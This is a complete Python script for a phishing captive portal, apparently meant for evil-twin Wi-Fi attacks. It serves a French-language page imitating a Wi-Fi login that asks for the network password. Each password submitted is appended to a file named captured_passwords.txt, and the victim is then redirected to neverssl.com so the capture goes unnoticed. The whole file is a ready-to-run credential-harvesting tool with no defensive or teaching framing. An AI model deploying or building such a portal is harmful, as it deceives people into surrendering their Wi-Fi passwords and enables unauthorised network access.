#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import os
from datetime import datetime

LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs/captured_passwords.txt")

class CaptiveHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        html = """<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Connexion Wi-Fi</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #f2f2f2;
      font-family: Arial, sans-serif;
    }
    .container {
      max-width: 500px;
      margin: 50px auto;
      padding: 20px;
      background-color: #fff;
      border-radius: 5px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    p {
      text-align: center;
      margin-bottom: 20px;
    }
    input[type="password"] {
      width: 100%;
      padding: 15px;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 16px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 15px;
      background-color: #007BFF;
      border: none;
      color: #fff;
      font-size: 16px;
      border-radius: 4px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
    @media (max-width: 600px) {
      .container {
        margin: 20px;
        padding: 15px;
      }
      input[type="password"], button {
        padding: 12px;
        font-size: 14px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Connexion Wi-Fi</h2>
    <p>Entrez votre mot de passe pour accéder à Internet :</p>
    <form method="POST" action="">
      <input type="password" name="password" placeholder="Mot de passe Wi-Fi" required>
      <button type="submit">Se connecter</button>
    </form>
  </div>
</body>
</html>
"""
        self.wfile.write(html.encode("utf-8"))

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length)
        data = urllib.parse.parse_qs(post_data.decode("utf-8"))
        password = data.get("password", [""])[0]
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {password}\n")
        self.send_response(302)
        self.send_header("Location", "http://neverssl.com")
        self.end_headers()

if __name__ == "__main__":
    PORT = 8080
    with socketserver.TCPServer(("", PORT), CaptiveHandler) as httpd:
        print(f"Portail captif lancé sur le port {PORT}")
        httpd.serve_forever()
